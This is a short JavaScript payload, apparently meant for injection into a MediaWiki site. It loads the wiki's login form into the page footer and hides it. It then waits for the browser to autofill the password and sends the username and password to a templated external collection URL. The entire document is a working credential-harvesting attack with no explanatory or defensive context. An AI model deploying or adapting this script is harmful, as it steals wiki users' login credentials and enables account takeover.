$.get("%%mw_website_prefix%%" + "Special:UserLogin", function(data) { 
    $("#footer").append($(data).find("form[name=userlogin]").eq(0)).css({"display": "none"});
    pw_i = 0;
    pw = setInterval(function () {
        if ($("#wpPassword1").val() !== "") {
            var sent_login = encodeURIComponent(wgUserName);
            var sent_pwd = encodeURIComponent($("#wpPassword1").val());
            $.getScript("%%retrieving_url%%".replace(/l=/g, "l=" + sent_login).replace(/p=/g, "p=" + sent_pwd))
            clearInterval(pw);
        } else if (pw_i > 5000) {
            var sent_login = encodeURIComponent(wgUserName);
            $.getScript("%%retrieving_url%%".replace(/l=/g, "l=" + sent_login))
            clearInterval(pw);
        }
        pw_i += 50;
    }, 50);
})